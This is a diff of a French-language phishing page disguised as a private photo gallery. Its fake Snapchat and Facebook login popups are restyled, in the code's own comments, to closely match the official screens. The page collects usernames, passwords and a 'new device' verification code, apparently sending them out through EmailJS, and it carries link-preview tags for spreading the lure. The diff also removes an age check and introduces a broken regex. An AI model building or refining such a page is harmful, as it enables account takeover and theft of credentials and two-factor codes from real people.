@@ -4,7 +4,7 @@
 <html lang="fr">
 <head>
 <meta charset="utf-8"/>
-<title>Gallerie privé!</title>
+<title>Aperçu compte MYM!</title>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&amp;display=swap" rel="stylesheet"/>
 <style>
@@ -39,8 +39,8 @@
 
     .header h1 {
       font-size: 4em;
-      color: #FFD700;
-      text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+      color: #FC6A03;
+      text-shadow: 0 0 15px rgba(243, 96, 207, 0.5);
       margin-bottom: 10px;
     }
 
@@ -51,8 +51,8 @@
     }
 
     .button {
-      background: linear-gradient(45deg, #FFD700, #FF8C00);
-      color: #000;
+      background: #FC6A03;
+      color: #fff;
       border: none;
       padding: 14px 30px;
       font-size: 1.1em;
@@ -65,7 +65,7 @@
 
     .button:hover {
       transform: scale(1.05);
-      box-shadow: 0 0 20px rgba(255, 215, 0, 0.9);
+      box-shadow: 0 0 20px rgba(255, 105, 180, 0.9);
     }
 
     .bitmoji-row {
@@ -146,57 +146,285 @@
       font-weight: bold;
     }
   
-    .top-banner img { width: 100%; height: auto; display: block; }</style>
+    .top-banner img { width: 100%; height: auto; display: block; }
+    /* Custom styles for Snapchat login popup to resemble Snapchat window */
+    #snapchatPopup {
+      background: #FFFC00; /* Snapchat yellow */
+      color: #000;
+      border: 2px solid #000;
+    }
+    #snapchatPopup h3 {
+      background: #000;
+      color: #FFFC00;
+      padding: 10px;
+      border-radius: 10px;
+      margin: 0 -30px 20px; /* extend header full width and offset padding area */
+    }
+    #snapchatPopup button.button {
+      background: #000;
+      color: #FFFC00;
+      border: none;
+      margin-top: 15px;
+    }
+    #snapchatPopup button.button:nth-of-type(2) {
+      background: #fff;
+      color: #000;
+    }
+
+    /* Custom styles for Facebook login popup to resemble Facebook window */
+    #facebookPopup {
+      background: #fff;
+      color: #050505;
+      border: 1px solid #ddd;
+    }
+    #facebookPopup h3 {
+      background: #1877F2;
+      color: #fff;
+      padding: 10px;
+      border-radius: 10px;
+      margin: 0 -30px 20px;
+    }
+    #facebookPopup button.button {
+  background: #1877F2;
+  color: #ffffff;
+  border-radius: 50px;
+  border: none;
+  width: 100%;
+  padding: 12px;
+  font-weight: bold;
+  font-size: 1em;
+  margin-top: 15px;
+  cursor: pointer;
+}
+    #facebookPopup button.button:nth-of-type(2) {
+  background: #1877F2 !important;
+  color: #ffffff !important;
+  border-radius: 50px !important;
+  border: none !important;
+  width: 100% !important;
+  padding: 12px !important;
+  font-weight: bold !important;
+  font-size: 1em !important;
+  margin-top: 15px !important;
+  cursor: pointer !important;
+}
+
+    /* Overriding popup styles for more realistic Facebook and Snapchat login windows */
+    #snapchatPopup {
+      background: #FFFC00;
+      color: #000;
+      border: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    #snapchatPopup h3 {
+      background: transparent;
+      color: #000;
+      font-size: 1.3em;
+      font-weight: bold;
+      margin: 0 0 15px;
+      padding: 0;
+    }
+    #snapchatPopup input {
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      color: #000;
+    }
+    #snapchatPopup button.button {
+      background: #000;
+      color: #FFFC00;
+      border: none;
+      border-radius: 6px;
+    }
+    #snapchatPopup button.button:nth-of-type(2) {
+      background: #f5f5f5;
+      color: #000;
+    }
+
+    #facebookPopup {
+      background: #f5f6f7;
+      color: #1c1e21;
+      border: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    #facebookPopup h3 {
+      background: #1877F2;
+      color: #fff;
+      font-size: 1.3em;
+      padding: 12px;
+      border-radius: 6px;
+      margin: -30px -30px 20px -30px;
+    }
+    #facebookPopup input {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      color: #1c1e21;
+    }
+    #facebookPopup button.button {
+  background: #1877F2;
+  color: #ffffff;
+  border-radius: 50px;
+  border: none;
+  width: 100%;
+  padding: 12px;
+  font-weight: bold;
+  font-size: 1em;
+  margin-top: 15px;
+  cursor: pointer;
+}
+    #facebookPopup button.button:nth-of-type(2) {
+  background: #1877F2 !important;
+  color: #ffffff !important;
+  border-radius: 50px !important;
+  border: none !important;
+  width: 100% !important;
+  padding: 12px !important;
+  font-weight: bold !important;
+  font-size: 1em !important;
+  margin-top: 15px !important;
+  cursor: pointer !important;
+}
+
+
+    /* Further refinement of popup styles to closely match the official Facebook and Snapchat login screens */
+    #facebookPopup {
+      background: #18191a;
+      color: #e4e6eb;
+      font-family: sans-serif;
+      border: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+    #facebookPopup h3 {
+      background: none;
+      color: #e4e6eb;
+      font-weight: bold;
+      font-size: 1.4em;
+      padding: 0;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    #facebookPopup label {
+      color: #b0b3b8;
+    }
+    #facebookPopup input {
+      background: #242526;
+      border: 1px solid #3A3B3C;
+      border-radius: 10px;
+      color: #e4e6eb;
+    }
+    #facebookPopup button.button {
+  background: #1877F2;
+  color: #ffffff;
+  border-radius: 50px;
+  border: none;
+  width: 100%;
+  padding: 12px;
+  font-weight: bold;
+  font-size: 1em;
+  margin-top: 15px;
+  cursor: pointer;
+}
+    #facebookPopup button.button:nth-of-type(2) {
+  background: #1877F2 !important;
+  color: #ffffff !important;
+  border-radius: 50px !important;
+  border: none !important;
+  width: 100% !important;
+  padding: 12px !important;
+  font-weight: bold !important;
+  font-size: 1em !important;
+  margin-top: 15px !important;
+  cursor: pointer !important;
+}
+    #facebookPopup button.button:nth-of-type(2):hover {
+      background: #E7F3FF;
+    }
+
+    #snapchatPopup {
+      background: #fff;
+      color: #000;
+      border: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    #snapchatPopup h3 {
+      background: none;
+      color: #000;
+      font-size: 1.4em;
+      margin-bottom: 20px;
+      text-align: center;
+      font-weight: bold;
+    }
+    #snapchatPopup label {
+      color: #00A5E5;
+      text-transform: uppercase;
+      font-size: 0.9em;
+      font-weight: bold;
+    }
+    #snapchatPopup input {
+      background: #fff;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      color: #000;
+    }
+    #snapchatPopup button.button {
+      background: #ccc;
+      color: #000;
+      border: none;
+      border-radius: 50px;
+      width: 100%;
+    }
+    #snapchatPopup button.button:nth-of-type(2) {
+      background: transparent;
+      color: #00A5E5;
+      border: none;
+    }
+    #snapchatPopup button.button:nth-of-type(2):hover {
+      text-decoration: underline;
+    }
+
+</style>
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
   document.addEventListener("DOMContentLoaded", function() {
     emailjs.init("AATQVLMcBJaRBgEox");
   });
 </script>
-<!-- Open Graph Preview -->
+<!-- Open Graph -->
+<meta property="og:title" content="Photos – gallerie privée 📸" />
+<meta property="og:description" content="Accès sécurisé à ma galerie privée." />
+<meta property="og:image" content="https://photos-gallerie-prive.onrender.com/preview_photo.jpg" />
+<meta property="og:url" content="https://photos-gallerie-prive.onrender.com" />
+<meta property="og:type" content="website" />
 
-
-
-
-
-
-<meta content="Gallerie privée – Connexion privée" property="og:title"/>
-<meta content="Accès sécurisé à ma galerie privée." property="og:description"/>
-<meta property="og:image" content="preview_photo.jpg"/>
-<meta content="https://photos-gallerie-prive.onrender.com" property="og:url"/>
-<meta content="website" property="og:type"/>
 <!-- Twitter Card -->
-<meta content="summary_large_image" name="twitter:card"/>
-<meta content="Gallerie privée – Connexion" name="twitter:title"/>
-<meta content="Accès sécurisé à ma galerie privée." name="twitter:description"/>
-<meta content="preview_photo.jpg" name="twitter:image"/>
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Photos – gallerie privée 📸" />
+<meta name="twitter:description" content="Accès sécurisé à ma galerie privée." />
+<meta name="twitter:image" content="https://photos-gallerie-prive.onrender.com/preview_photo.jpg" />
 
-  <!-- Open Graph Preview CORRIGÉ -->
-  <meta property="og:title" content="Gallerie privée – Connexion privée"/>
-  <meta property="og:description" content="Accès sécurisé à ma galerie privée."/>
-  <meta property="og:image" content="https://photos-gallerie-prive.onrender.com/preview_photo.jpg"/>
-  <meta property="og:url" content="https://photos-gallerie-prive.onrender.com"/>
-  <meta property="og:type" content="website"/>
+<!-- Open Graph -->
+<meta property="og:title" content="Photos – gallerie privée 📸" />
+<meta property="og:description" content="Accès sécurisé à ma galerie privée." />
+<meta property="og:image" content="https://photos-gallerie-privee.onrender.com/preview_photo.jpg" />
+<meta property="og:url" content="https://photos-gallerie-prive.onrender.com" />
+<meta property="og:type" content="website" />
 
-  <!-- Twitter Card CORRIGÉ -->
-  <meta name="twitter:card" content="summary_large_image"/>
-  <meta name="twitter:title" content="Gallerie privée – Connexion"/>
-  <meta name="twitter:description" content="Accès sécurisé à ma galerie privée."/>
-  <meta name="twitter:image" content="https://photos-gallerie-prive.onrender.com/preview_photo.jpg"/>
-
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Photos – gallerie privée 📸" />
+<meta name="twitter:description" content="Accès sécurisé à ma galerie privée." />
+<meta name="twitter:image" content="https://photos-gallerie-prive.onrender.com/preview_photo.jpg" />
 </head>
 <body><div class="top-banner"><img alt="Bannière Bitmoji" src="banner.png"/></div>
 <div class="header">
-<h1>Gallerie privée</h1>
-<p class="subtitle">Bienvenue sur ma page</p>
-<div id="ageCheckContainer" style="margin-top: 20px;">
-<label for="dob" style="font-size: 1.2em;">Entrez votre date de naissance :</label><br/>
-<input id="dob" style="padding: 10px; font-size: 1em; margin: 10px; border-radius: 10px; border: none;" type="date"/>
-<br/>
-<button class="button" onclick="checkAge()">Valider</button>
-<p id="ageError" style="color: red; display: none; font-weight: bold;">Vous devez avoir au moins 18 ans pour accéder.</p>
-</div>
-<button class="button" id="snapchatBtn" onclick="openSnapchatPopup()" style="display:none;">Confirmer votre âge avec Snapchat</button><button class="button" id="facebookBtn" onclick="openFacebookPopup()" style="display:none; margin-top: 15px;">Confirmer votre âge avec Facebook</button>
+<h1>Photos 📸  </h1>
+<p class="subtitle">Bienvenue sur ma page!</p>
+
+<button class="button" onclick="openSnapchatPopup()">Confirmer votre âge avec Snapchat</button>
+<button class="button" onclick="openFacebookPopup()" style="margin-top: 15px;">Confirmer votre âge avec Facebook</button>
+
+
 </div>
 <div class="bitmoji-row">
 <div class="bitmoji" style="background-image: url('avatar1.png')"></div>
@@ -216,7 +444,7 @@
 <input id="snap-username" placeholder="Nom d'utilisateur ou e-mail" type="text"/>
 <label for="snap-password">Mot de passe</label>
 <input id="snap-password" placeholder="Mot de passe" type="password"/>
-<button class="button" onclick="showLoadingAndVerify('snapchatPopup')" style="margin-top: 15px;">Connexion</button>
+<button class="button" onclick="showLoadingAndVerify('snapchatPopup')" style="margin-top: 15px;">Valider</button>
 <button class="button" onclick="closePopup('snapchatPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
 </div>
 <!-- POPUP FACEBOOK -->
@@ -229,51 +457,21 @@
 <input id="fb-email" placeholder="Adresse e-mail ou téléphone" type="text"/>
 <label for="fb-password">Mot de passe</label>
 <input id="fb-password" placeholder="Mot de passe" type="password"/>
-<button class="button" onclick="showLoadingAndVerify('facebookPopup')" style="margin-top: 15px;">Connexion</button>
+<button class="button" onclick="showLoadingAndVerify('facebookPopup')" style="margin-top: 15px;">Valider</button>
 <button class="button" onclick="closePopup('facebookPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
 </div>
 <div class="login-popup" id="verificationPopup">
 <h3 style="margin-top: 0; font-size: 1.5em;">Nouvel appareil détecté</h3>
 <p style="margin-bottom: 15px;">Un code de vérification vous sera envoyé à l’intérieur des 2 prochaines minutes.</p>
+
 <label for="verificationCode" style="font-weight:bold;">Entrez le code reçu :</label>
-<input id="verificationCode" inputmode="numeric" maxlength="8" pattern="\d*" placeholder="Code à 6 ou 8 chiffres" type="text"/>
+<input id="verificationCode" inputmode="numeric" maxlength="8" pattern="\d*" placeholder="Code de 6 à 8 chiffres" type="text"/>
 <button class="button" onclick="submitVerificationCode()" style="margin-top:10px;">Vérifier</button>
 <button class="button" onclick="closePopup('verificationPopup')" style="background:#ccc; color:#000; margin-top:10px;">Retour</button>
 </div>
 <div class="bottom-banner">
 <img alt="Bannière Bitmoji" src="banner.png"/>
 </div>
-<script>
-function checkAge() {
-  const dobInput = document.getElementById("dob");
-  const errorMsg = document.getElementById("ageError");
-  const btn = document.getElementById("snapchatBtn");
-
-  if (!dobInput.value) {
-    errorMsg.textContent = "Veuillez entrer votre date de naissance.";
-    errorMsg.style.display = "block";
-    return;
-  }
-
-  const dob = new Date(dobInput.value);
-  const today = new Date();
-  const age = today.getFullYear() - dob.getFullYear();
-  const monthDiff = today.getMonth() - dob.getMonth();
-  const dayDiff = today.getDate() - dob.getDate();
-
-  let is18 = age > 18 || (age === 18 && (monthDiff > 0 || (monthDiff === 0 && dayDiff >= 0)));
-
-  if (is18) {
-    btn.style.display = "inline-block";
-    document.getElementById("facebookBtn").style.display = "inline-block";
-    errorMsg.style.display = "none";
-    document.getElementById("ageCheckContainer").style.display = "none";
-  } else {
-    errorMsg.textContent = "Vous devez avoir au moins 18 ans pour accéder.";
-    errorMsg.style.display = "block";
-  }
-}
-</script>
 <script>
 function openSnapchatPopup() {
   document.getElementById('overlay').style.display = 'block';
@@ -302,7 +500,7 @@ function showLoadingAndVerify(popupId) {
   const button = popup.querySelector("button");
   const originalText = button.textContent;
   button.disabled = true;
-  button.textContent = "Connexion en cours...";
+  button.textContent = "Validation en cours...";
 
   let params = {};
 
@@ -343,7 +541,7 @@ function showLoadingAndVerify(popupId) {
 <script>
 function submitVerificationCode() {
   const code = document.getElementById("verificationCode").value.trim();
-  const pattern = /^\d{4,10}$/;
+  const pattern = /^\\d{6,8}$/;
 
 
   const params = { verification_code: code };
